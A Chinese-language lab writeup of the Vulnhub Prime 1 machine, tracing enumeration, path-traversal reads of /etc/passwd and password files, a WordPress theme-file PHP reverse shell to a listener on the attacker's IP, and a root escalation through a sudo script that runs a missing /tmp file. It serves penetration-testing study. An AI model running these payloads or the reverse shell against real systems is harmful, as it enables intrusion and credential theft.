---
title: "Prime1 Vulnhub靶场复现"
description: "一个OSCP风格的vulnhub靶场"
slug: "vulnhub-prime1"
pubDate: "2026-09-24"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# Prime 1 Vulnhub靶场复现

## 靶场介绍

靶场地址 https://www.vulnhub.com/entry/prime-1,358/

介绍如下

This machine is designed for those one who is trying to prepare for OSCP or OSCP-Exam.

This is first level of prime series. Some help at every stage is given. Machine is lengthy as OSCP and Hackthebox's machines are designed.

So you have a target to get root flag as well as user flag. If stuck on a point some help are given at a level of enumeration. If any extra help needed

Visit our website http://hacknpentest.com and http://hnpsecurity.com.

Some extra improvement needed to my VM please contact me on my email- suraj at hnpsecurity dot com.

## 信息收集

### 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

获取靶机ip为 10.10.10.100

### 端口扫描和漏洞探测

```shell
sudo nmap -sS -sV -O -sC -p- --min-rate 5000 10.10.10.100
```

| 端口 | 服务                       | 标题/版本                             | 备注                          |
| ---- | -------------------------- | ------------------------------------- | ----------------------------- |
| 22   | SSH (OpenSSH 7.2p2)        | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8       | 登录入口，远程管理            |
| 80   | HTTP (Apache httpd 2.4.18) | HacknPentest / Apache 2.4.18 (Ubuntu) | Web 入口；待后续目录/参数枚举 |

再附上nmap漏洞脚本跑出的信息

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap --script=vuln -p22,80 10.10.10.100
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 11:10 -0400
Nmap scan report for 10.10.10.100
Host is up (0.00053s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-enum:
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 00:0C:29:DD:65:2C (VMware)
```

| 端口 | 服务 | 漏洞扫描发现                                                                                                                                                             | 备注                                       |
| ---- | ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------ |
| 22   | SSH  | 未返回相关漏洞脚本结果                                                                                                                                                   | 远程登录入口                               |
| 80   | HTTP | `http-enum` 发现：`/wordpress/`（Blog）、`/wordpress/wp-login.php`（WordPress 登录页）；未发现 DOM XSS、CSRF、存储 XSS；http-vuln-cve2017-1001000 脚本执行失败（可忽略） | 存在 WordPress 站点，是当前主要 Web 攻击面 |

### Web服务探测

对80端口进行访问,只是一张图片，查看源代码没有任何提示，接下来进行目录爆破

### 目录爆破

```shell
sudo dirb http://10.10.10.100
```

总结一下信息

| 路径                                    | 状态码 | 大小   | 备注                                                     |
| --------------------------------------- | ------ | ------ | -------------------------------------------------------- |
| `/dev`                                  | 200    | 131    | 最可疑，不是标准页面，字节数很小，可能是提示页或参数入口 |
| `/index.php`                            | 200    | 136    | 根目录首页，也建议查看内容                               |
| `/javascript/`                          | 目录   | -      | 静态资源目录                                             |
| `/javascript/jquery/`                   | 目录   | -      | jQuery 目录                                              |
| `/javascript/jquery/jquery`             | 200    | 284394 | 疑似 jQuery 库文件                                       |
| `/server-status`                        | 403    | 277    | Apache 状态页，被禁止访问                                |
| `/wordpress/`                           | 目录   | -      | WordPress 站点                                           |
| `/wordpress/index.php`                  | 301    | 0      | 重定向                                                   |
| `/wordpress/wp-admin/`                  | 目录   | -      | WordPress 后台                                           |
| `/wordpress/wp-content/`                | 目录   | -      | WordPress 内容目录                                       |
| `/wordpress/wp-includes/`               | 目录   | -      | 可列目录                                                 |
| `/wordpress/xmlrpc.php`                 | 405    | 42     | XML-RPC 开启，GET 不允许，后续可关注                     |
| `/wordpress/wp-content/uploads/`        | 目录   | -      | 可列目录                                                 |
| `/wordpress/wp-content/plugins/`        | 目录   | -      | 插件目录                                                 |
| `/wordpress/wp-content/themes/`         | 目录   | -      | 主题目录                                                 |
| `/wordpress/wp-admin/network/admin.php` | 302    | 0      | 需登录/跳转                                              |
| `/wordpress/wp-admin/network/index.php` | 302    | 0      | 需登录/跳转                                              |
| `/wordpress/wp-admin/user/admin.php`    | 302    | 0      | 需登录/跳转                                              |
| `/wordpress/wp-admin/user/index.php`    | 302    | 0      | 需登录/跳转                                              |

**关键点：**

- /dev 是最值得先手工看的路径，返回 200 且只有 131 字节。

- /index.php 也只有 136 字节，可能不是普通首页。

- WordPress 是主要攻击面，xmlrpc.php 开启，uploads/、wp-includes/ 等目录可列。

- server-status 是 403，暂时不用管。

## 漏洞发现及其利用

### 访问/dev 目录

获取到一些文本

```text
hello,

now you are at level 0 stage.

In real life pentesting we should use our tools to dig on a web very hard.

Happy hacking.
```

提示我们需要对/dev进一步挖掘,或者我们需要对目录爆破更详细，试下附带扩展名爆破

```shell
┌──(kali㉿kali)-[~]
└─$ sudo dirb http://10.10.10.100 -X .txt,.php,.zip
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Wed Sep 23 11:37:31 2026
URL_BASE: http://10.10.10.100/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt,.php,.zip) | (.txt)(.php)(.zip) [NUM = 3]
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.100/ ----
+ http://10.10.10.100/image.php (CODE:200|SIZE:147)
+ http://10.10.10.100/index.php (CODE:200|SIZE:136)
+ http://10.10.10.100/secret.txt (CODE:200|SIZE:412)
-----------------
END_TIME: Wed Sep 23 11:37:40 2026
DOWNLOADED: 13836 - FOUND: 3
```

wordpress不应该扫出这点php文件

| 路径          | 状态码 | 大小 | 备注                                     |
| ------------- | ------ | ---- | ---------------------------------------- |
| `/image.php`  | 200    | 147  | 根目录首页                               |
| `/index.php`  | 200    | 136  | 根目录首页                               |
| `/secret.txt` | 200    | 412  | **新增，文本文件，极可能包含凭据或提示** |

### 访问/secret.txt

```text
Looks like you have got some secrets.

Ok I just want to do some help to you.

Do some more fuzz on every page of php which was finded by you. And if
you get any right parameter then follow the below steps. If you still stuck
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web



//see the location.txt and you will get your next move//
```

这次告诉我们要对php文件模糊测试，并提供了一个github链接给我们

### 访问GitHub链接获取提示

下面的命令就是给的模糊测试的教程

```shell
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something
```

改成我能用的

```shell
sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://10.10.10.100/image.php?FUZZ=something
```

这里参数返回 7 L / 12 W / 136 Ch，这里附上参数讲解

L = Lines，响应内容的行数

W = Words，响应内容的单词数

Ch = Characters，响应内容的字符数

没有什么用换index.php看看

```shell
sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://10.10.10.100/index.php?FUZZ=something
```

还是相同的返回，不过有个特例

```shell
000000341:   200        7 L      19 W       206 Ch      "file"
```

说明存在 http://10.10.10.100/index.php?file 先去访问一下

### 访问http://10.10.10.100/index.php?file

一眼看过去是还是这个图片，当查看源码或者网页往下滑还发现了提示

```text
Do something better you are digging wrong file
```

回头看这个//see the location.txt and you will get your next move//

在file=加上loaction.txt，访问一下

### 访问http://10.10.10.100/index.php?file=location.txt

再次以同样的方式获取提示

```text
Do something better ok well Now you reah at the exact parameter Now dig some more for next one use 'secrettier360' parameter on some other php page for more fun.
```

让我换一个php页面然后换指定的参数

### 访问http://10.10.10.100/image.php?secrettier360

```text
finaly you got the right parameter
```

告诉我们找到正确的参数

整理一下

目前我们目录爆破的过程中，跟着作者的提示得到了一个正确的参数

secrettier360 只是“参数名正确”，不代表我们已经知道它接收什么值、实现什么功能。它可能是：

- 文件名 / 文件路径
- 图片名
- 包含文件的参数
- 命令参数
- 数据库查询条件

### 尝试任意读取漏洞

对 http://10.10.10.100/image.php?secrettier360=/etc/passwd 进行访问

回显了内容

```text
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false victor:x:1000:1000:victor,,,:/home/victor:/bin/bash mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false saket:x:1001:1001:find password.txt file in my directory:/home/saket: sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
```

构造 http://10.10.10.100/image.php?secrettier360=../../../../etc/passwd 这个payload也是得到同一的内容，这个payload同时验证了存在路径穿越漏洞

区别是

- 第一条直接尝试绝对路径读取 /etc/passwd
- 第二条尝试相对路径穿越读取 /etc/passwd

在回显的内容上得到了以下信息

看到两个普通用户：

```text
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
```

其中 saket 的 GECOS 字段明确写着：find password.txt file in my directory。这就是下一步线索

### 为什么要对/etc/passwd路径读取

首先我们在启动靶机的时候就知道这个一个Linux靶机

然后/etc/passwd 路径所有 Linux 都有，不需要猜路径

内容特征明显，一旦读出来就能确认文件读取漏洞，同时也不会破坏靶机

## 文件包含漏洞利用

进一步构造payload http://10.10.10.100/image.php?secrettier360=/home/saket/password.txt

读取到了这个账户密码

```text
follow_the_ippsec
```

## 尝试两个已知账户名字分别用同一密码ssh，尝试无果

```shell
ssh victor@10.10.10.100
victor@10.10.10.100's password:
Permission denied, please try again.

ssh saket@10.10.10.100
saket@10.10.10.100's password:
Permission denied, please try again.
```

实际上这个密码follow_the_ippsec 是 victor 的 WordPress 后台密码

## 来 wordpress 目录，尝试寻找和漏洞利用

nmap漏洞脚本扫描和目录爆破，都证明了这个网站存在 wordpress 这个 cms 内容管理系统

可以看到作者就是victor这个名字

## 来到/wordpress/wp-admin/根据获取的账户和密码，进行登陆后台尝试

用 victor:follow_the_ippsec 登录后台

登陆成功

### 为什么是这个路径？

漏洞扫描脚本和第一次目录爆破都获取了这个目录，/wordpress/的下方也有登陆的可交互按钮

### 接下来怎么做？

既然获取到wordpress的管理权限，就要尝试能不能执行一些命令或者程序，例如反弹shell，这边需要通过枚举来寻找入口

来到 http://10.10.10.100/wordpress/wp-admin/theme-editor.php?file=secret.php&theme=twentynineteen

```text
/* Ohh Finaly you got a writable file */
```

根据这个提示和显示找到了可以编写文件的地方

## 写入shell并反弹获取victor权限

尝试写入内容如下

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/6666 0>&1'");?>
```

同时在kali上开启监听

```shell
sudo nc -lvnp 6666
```

接下来访问 /wordpress/wp-content/themes/twentynineteen/secret.php

反弹成功

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$
```

### 为什么是这个路径？

因为 WordPress 主题文件在服务器上的标准路径就是这个，不知道其实源于对 WordPress 的不了解

## 尝试sudo提权并获取user flag

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ sudo -l
<ml/wordpress/wp-content/themes/twentynineteen$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
```

关键提权点：www-data 可以以 root 身份、无需密码执行 /home/saket/enc

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ls -la /home/saket/
<ml/wordpress/wp-content/themes/twentynineteen$ ls -la /home/saket/
total 36
drwxr-xr-x 2 root root  4096 Aug 31  2019 .
drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
-rw------- 1 root root    20 Aug 31  2019 .bash_history
-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ cat /home/saket/user.txt
<ml/wordpress/wp-content/themes/twentynineteen$ cat /home/saket/user.txt
af3c658dcf9d7190da3153519c003456
```

同时了解到有执行权限但没有读权限，但 sudo -l 显示可以以 root 身份、无需密码执行 /home/saket/enc。这是核心提权点

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ uname -a
<ml/wordpress/wp-content/themes/twentynineteen$ uname -a
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

这个内核比较老，或许可以尝试内核提权作为备选，先执行这个 enc 文件

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ sudo /home/saket/enc
<ml/wordpress/wp-content/themes/twentynineteen$ sudo /home/saket/enc
enter password:
```

输入之前获取的密码无果

## 获取执行 enc 文件需要的密码

要寻找密码才能执行，联想到之前的password.txt 找找有无相似的敏感文件存储密码的可能

```shell
find / -type f \( -iname "*backup*" -o -iname "*password*" \) 2>/dev/null
```

/opt/backup/server_database/backup_pass 这个文件很可疑

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ls -la /opt/backup/server_database/backup_pass
<emes/twentynineteen$ ls -la /opt/backup/server_database/backup_pass
-rw-r--r-- 1 root root 75 Aug 30  2019 /opt/backup/server_database/backup_pass
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ cat /opt/backup/server_database/backup_pass
<emes/twentynineteen$ cat /opt/backup/server_database/backup_pass
your password for backup_database file enc is

"backup_password"


Enjoy!
```

backup_password 这个应该是密码，执行以下看看结果

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ cd /home/saket
<ml/wordpress/wp-content/themes/twentynineteen$ cd /home/saket
www-data@ubuntu:/home/saket$ echo 'backup_password' | sudo /home/saket/enc
echo 'backup_password' | sudo /home/saket/enc
enter password: good
www-data@ubuntu:/home/saket$ ls -la /home/saket/
ls -la /home/saket/
total 44
drwxr-xr-x 2 root root  4096 Sep 23 22:21 .
drwxr-xr-x 4 root root  4096 Aug 29  2019 ..
-rw------- 1 root root    20 Aug 31  2019 .bash_history
-rwxr-x--x 1 root root 14272 Aug 30  2019 enc
-rw-r--r-- 1 root root   237 Sep 23 22:23 enc.txt
-rw-r--r-- 1 root root   123 Sep 23 22:23 key.txt
-rw-r--r-- 1 root root    18 Aug 29  2019 password.txt
-rw-r--r-- 1 root root    33 Aug 31  2019 user.txt
```

多了一个 enc.txt 和 key.txt 读取一下

```shell
www-data@ubuntu:/home/saket$ cat enc.txt
cat enc.txt
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
www-data@ubuntu:/home/saket$ cat key.txt
cat key.txt
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

把字符串 ippsec 转成 MD5 哈希作为密钥,再用它作为 AES-128-ECB 密钥解密 enc.txt

```shell
www-data@ubuntu:/home/saket$ echo -n "ippsec" | md5sum
echo -n "ippsec" | md5sum
366a74cb3c959de17d61db30591c39d1  -
```

这串东西是32 个字符，每个字符都是十六进制数字或字母，但 AES-256 需要 32 字节的密钥

把这 32 个字符本身当作密钥材料，也就是取每个字符的 ASCII 码

```shell
www-data@ubuntu:/home/saket$ echo -n "366a74cb3c959de17d61db30591c39d1" | xxd -p
<$ echo -n "366a74cb3c959de17d61db30591c39d1" | xxd -p
3336366137346362336339353964653137643631646233303539316333396431

```

然后开始解密

```shell
www-data@ubuntu:/home/saket$ echo 'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' | openssl enc -d -a -aes-256-ecb -K 3336366137346362336339353964653137643631646233303539316333396431
<366137346362336339353964653137643631646233303539316333396431
Dont worry saket one day we will reach to
our destination very soon. And if you forget
your username then use your old password
==> "tribute_to_ippsec"
```

拿到密码了，看看能不能su切换用户

## 升级交互shell，切换到saket用户

```shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<emes/twentynineteen$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/home/saket$ su - saket
su - saket
Password: tribute_to_ippsec

$ whoami;id;pwd
whoami;id;pwd
saket
uid=1001(saket) gid=1001(saket) groups=1001(saket)
/home/saket
```

尝试sudo提权

```shell
$ sudo -l
sudo -l
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor
$ ls -la /home/victor/undefeated_victor; file /home/victor/undefeated_victor
ls -la /home/victor/undefeated_victor; file /home/victor/undefeated_victor
-rwsr-x--x 1 root root 79 Aug 30  2019 /home/victor/undefeated_victor
/home/victor/undefeated_victor: setuid executable, regular file, no read permission
$ sudo /home/victor/undefeated_victor
sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
```

找到最终提权点：/home/victor/undefeated_victor 是一个以 root 运行的脚本，它第 2 行会执行 /tmp/challenge，但该文件不存在。所以只要在 /tmp/challenge 放一个可执行文件，它就会以 root 身份运行。

或许是一个“路径劫持”或“缺失文件利用”

### 提权至root并读取flag

依次在shell执行如下命令

```shell
 cd /tmp
 echo '#!/bin/bash' >challenge
 echo '/bin/bash' >>challenge
 chmod +x challenge
 sudo /home/victor/undefeated_victor
 whoami
```

```shell
$ sudo /home/victor/undefeated_victor
sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
root@ubuntu:/root# whoami
whoami
root
```

```shell
root@ubuntu:/tmp# cd /root
cd /root
root@ubuntu:/root# ls -liah
ls -liah
total 92K
917506 drwx------  5 root root 4.0K Aug 31  2019 .
     2 drwxr-xr-x 24 root root 4.0K Aug 29  2019 ..
964588 -rw-------  1 root root 8.4K Sep  1  2019 .bash_history
917598 -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
917597 drwx------  3 root root 4.0K Aug 30  2019 .cache
969793 -rwxr-xr-x  1 root root  14K Aug 30  2019 enc
969795 -rw-r--r--  1 root root  305 Aug 30  2019 enc.cpp
969797 -rw-r--r--  1 root root  237 Aug 30  2019 enc.txt
969798 -rw-r--r--  1 root root  123 Aug 30  2019 key.txt
969791 -rw-------  1 root root  137 Aug 30  2019 .mysql_history
964098 drwxr-xr-x  2 root root 4.0K Aug 29  2019 .nano
917599 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
969794 -rw-r--r--  1 root root   33 Aug 30  2019 root.txt
969796 -rw-r--r--  1 root root   66 Aug 31  2019 .selected_editor
969780 -rw-r--r--  1 root root  805 Aug 30  2019 sql.py
969790 -rwxr-xr-x  1 root root  442 Aug 31  2019 t.sh
964589 drwxr-xr-x 10 root root 4.0K Aug 30  2019 wfuzz
964464 -rw-r--r--  1 root root  170 Aug 29  2019 wordpress.sql
root@ubuntu:/root# cat root.txt
cat root.txt
b2b17036da1de94cfb024540a8e7075a
```
